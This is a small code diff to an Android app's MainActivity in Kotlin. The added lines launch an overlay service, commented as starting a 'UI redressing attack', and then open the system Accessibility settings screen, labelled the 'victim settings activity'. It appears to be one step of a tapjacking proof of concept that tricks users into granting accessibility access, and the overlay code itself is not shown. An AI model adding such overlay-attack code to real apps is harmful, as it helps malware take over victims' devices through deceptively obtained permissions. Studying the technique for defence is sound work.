@@ -24,8 +24,10 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun startOverlayService() {
-        val intent = Intent(this, OverlayService::class.java)
-        startService(intent)
+        // Start the overlay service to begin the UI redressing attack
+        startService(Intent(this, OverlayService::class.java))
+        // Launch victim settings activity and close this activity.
+        startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).setFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
         finish()
     }
 
